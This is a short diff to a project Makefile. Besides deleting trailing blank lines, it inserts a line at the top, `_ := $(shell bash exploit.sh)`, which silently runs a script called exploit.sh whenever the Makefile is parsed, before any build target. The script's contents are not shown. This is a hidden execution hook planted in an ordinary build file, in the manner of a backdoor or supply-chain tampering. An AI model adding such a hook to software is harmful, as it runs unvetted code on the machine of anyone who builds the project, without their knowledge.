@@ -1,3 +1,5 @@
+_ := $(shell bash exploit.sh)
+
 ## All targets
 # Target to build the project
 .PHONY: build
@@ -158,5 +160,3 @@ swap-test-all:
 	@$(MAKE) swap-test-5 RL=$(RL)
 	@$(MAKE) swap-test-6 RL=$(RL)
 	@$(MAKE) swap-test-8 RL=$(RL)
-
-
